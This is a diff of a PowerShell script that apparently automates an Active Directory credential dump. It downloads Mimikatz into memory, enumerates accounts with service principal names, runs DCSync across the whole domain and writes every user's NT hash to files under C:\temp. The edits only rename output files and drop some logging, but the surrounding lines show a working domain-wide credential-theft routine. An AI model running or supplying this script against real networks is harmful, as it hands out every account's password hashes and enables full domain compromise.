@@ -5,12 +5,10 @@ $DATE = $(get-date -f yyyyMMddThhmm)
 $PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
 $EXT = ".txt"
 $LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full" + $EXT
-$SPNLOG = $PATH + $DATE + "_" + "spnuser_fulldetails" + $EXT
-$SPNUSERS = $PATH + $DATE + "_" + "spnuser_samaccountname" + $EXT
-$SPNHASHES = $PATH + $DATE + "_" + "DCSYNC_NTLM_SPN_full" + $EXT
-$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes" + $EXT
-$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users" + $EXT
-$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import" + $EXT
+$LOGSPN = $PATH + $DATE + "_" + "DCSYNC_NTLM_SPN_full" + $EXT
+$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes_FINAL" + $EXT
+$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users_FINAL" + $EXT
+$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import_FINAL" + $EXT
 
 # download mimikatz into memory
 Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
@@ -34,9 +32,7 @@ if ($confirmation -eq 'y') {
 
     # enumerate user accounts with service principal name (SPN)
     Write-Host "[INFO] Enumerating user accounts with set SPN" -ForegroundColor Gray
-    Get-DomainUser -SPN > $SPNLOG
     $loop = Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname }
-    $loop > $SPNUSERS
 
     # execute DCSync over the whole domain
     Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
@@ -47,7 +43,7 @@ if ($confirmation -eq 'y') {
     Write-Host "[!] Extracting SPN users from DCSync logfile" -ForegroundColor Yellow
     foreach ($spn in $loop) {
     get-content $LOG -ReadCount 1000 |
-        foreach { $_ -match $spn } >> $SPNHASHES
+        foreach { $_ -match $spn } >> $LOGSPN
     }
 
     # GET NT-HASHES ONLY
